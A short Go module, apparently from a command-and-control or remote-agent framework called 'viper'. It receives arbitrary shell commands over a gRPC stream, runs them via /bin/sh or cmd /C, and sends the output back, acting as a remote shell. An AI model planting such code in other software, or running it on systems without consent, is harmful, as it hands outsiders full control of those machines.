package modules

import (
	"context"
	"log"
	"os/exec"
	"runtime"
	pb "viper/protos/cmds"
)

func runShellModule(client pb.AgentClient) {
	stream, err := client.RunShellCommand(context.Background())
	if err != nil {
		log.Fatalf("Failed to open stream: %v", err)
	}
	for {
		in, err := stream.Recv()
		if err != nil {
			log.Fatalf("Failed to receive a shell command: %v", err)
		}
		log.Printf("Received shell command: '%s'", in.Cmd)
		err = stream.Send(&pb.ShellCommandResponse{Output: runShellCommand(in.Cmd)})
		if err != nil {
			log.Printf("Failed to send shell command response: %v", err)
		}
	}
}

func runShellCommand(cmdline string) []byte {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdline)
	} else {
		cmd = exec.Command("/bin/sh", "-c", cmdline)
	}
	out, _ := cmd.CombinedOutput()
	return out
}
